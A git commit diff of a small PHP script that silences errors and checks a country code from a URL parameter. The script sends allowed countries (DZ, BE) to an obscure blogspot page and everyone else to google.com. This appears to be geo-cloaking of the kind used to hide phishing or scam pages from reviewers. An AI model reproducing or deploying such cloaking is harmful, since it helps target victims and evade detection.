e84b76f58f82bd8cf257570865d14fe2aa1400a5
drive4dz <76058977+drive4dz@users.noreply.github.com>
2020-12-18 12:11:41 +0100

    Update 1.php

--- 1.php
+++ 1.php
@@ -3,9 +3,10 @@
 error_reporting(0);
 $dd = $_GET["dz"];
 $ok = 0;
-if($dd == 'GB') {$ok = 1;}
-if($dd == 'IE') {$ok = 1;}
+//if($dd == 'GB') {$ok = 1;}
+//if($dd == 'IE') {$ok = 1;}
 if($dd == 'DZ') {$ok = 1;}
+if($dd == 'BE') {$ok = 1;}
 
 if($ok == '1') {$ok = "https://foridmotin.blogspot.com/ol/jziu.html";}else{$ok = "https://google.com";}
 
